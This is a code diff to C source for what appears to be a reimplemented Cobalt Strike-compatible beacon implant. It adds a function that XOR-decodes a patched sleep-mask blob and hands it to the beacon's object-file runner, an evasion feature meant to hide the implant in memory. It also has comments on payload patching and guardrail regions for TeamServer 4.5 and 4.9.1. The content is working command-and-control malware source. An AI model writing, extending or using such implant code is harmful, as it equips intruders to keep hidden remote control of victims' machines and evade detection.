@@ -91,8 +91,11 @@ char myargs[PATCH_SIZE] = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMN
  *
  *   SSSSLLLLEEEEPPPPMMMMAAAASSSSKKKK -> 16384-byte sleep-mask blob (patchSleepMaskString
  *     has NO missing-magic guard, so payload generation hard-fails without it).
- *     The blob is the official BOF sleep mask; opaque to this beacon, whose own
- *     sleep loop does not consume it.
+ *     The blob is the official BOF sleep mask. GargleSleep XOR-decodes it
+ *     (key at [0:4], BE length at [4:8] unxored, payload from 8) and runs
+ *     it via command_inline_execute_object_parsed with the sleep time as
+ *     a 4-byte BE integer argument. Unpatched SSSS falls back to the 4.5
+ *     trampoline.
  *
  *   GGGGuuuu...dddd -> 2048-byte BeaconGuardrails blob. applyPatch is optional
  *     on the TS (skips if magic is absent). When patched, settings_init reverses
@@ -101,6 +104,29 @@ char myargs[PATCH_SIZE] = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMN
  * The 4.5 TeamServer ignores both regions, so one binary serves 4.5 and 4.9.1. */
 char sleepmask_region[16416] = "SSSSLLLLEEEEPPPPMMMMAAAASSSSKKKK";
 char guard_region[2112] = "GGGGuuuuaaaarrrrddddRRRRaaaaiiiillllssssPPPPaaaayyyyllllooooaaaadddd";
+
+/* Inverse of BeaconPayload.patchSleepMaskString: [0:4]=XOR key (1..252),
+ * [4:8]=BE payload length left in the clear, [8:]=payload XOR key[i%4].
+ * Unpatched SSSSLLLL… returns 0 so GargleSleep uses the 4.5 trampoline. */
+int sleepmask_decode(char * out, int max) {
+	unsigned char * r = (unsigned char *)sleepmask_region;
+	unsigned char key[4];
+	unsigned int len;
+	unsigned int i;
+	if (out == NULL || max <= 0)
+		return 0;
+	if (r[0] == 'S' && r[1] == 'S' && r[2] == 'S' && r[3] == 'S')
+		return 0;
+	key[0] = r[0]; key[1] = r[1]; key[2] = r[2]; key[3] = r[3];
+	memcpy(&len, r + 4, 4);
+	len = ntohl(len);
+	if (len == 0 || len > 16376 || (int)len > max)
+		return 0;
+	memcpy(out, r + 8, len);
+	for (i = 0; i < len; i++)
+		out[i] = (char)(out[i] ^ key[i % 4]);
+	return (int)len;
+}
 
 unsigned short setting_short(int field) {
 	setting value = setting_get(field);
